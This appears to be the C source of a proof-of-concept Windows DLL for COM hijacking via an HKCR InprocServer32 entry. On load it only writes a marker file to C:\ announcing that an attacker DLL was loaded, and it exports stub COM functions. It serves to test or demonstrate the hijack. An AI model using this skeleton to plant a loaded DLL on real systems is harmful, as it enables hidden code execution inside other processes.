#include <windows.h>
#include <string.h>
static void mark(const char *m) {
    HANDLE f = CreateFileA("C:\\poc-p6-marker.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f != INVALID_HANDLE_VALUE) { DWORD w=0; WriteFile(f, m, (DWORD)strlen(m), &w, NULL); CloseHandle(f); }
}
BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {
    if (reason == DLL_PROCESS_ATTACH) mark("P6: attacker DLL loaded via HKCR InprocServer32\r\n");
    return TRUE;
}
__declspec(dllexport) HRESULT __stdcall DllGetClassObject(REFCLSID rclsid, REFIID riid, void **ppv) {
    return CLASS_E_CLASSNOTAVAILABLE;
}
__declspec(dllexport) HRESULT __stdcall DllCanUnloadNow(void) { return S_OK; }
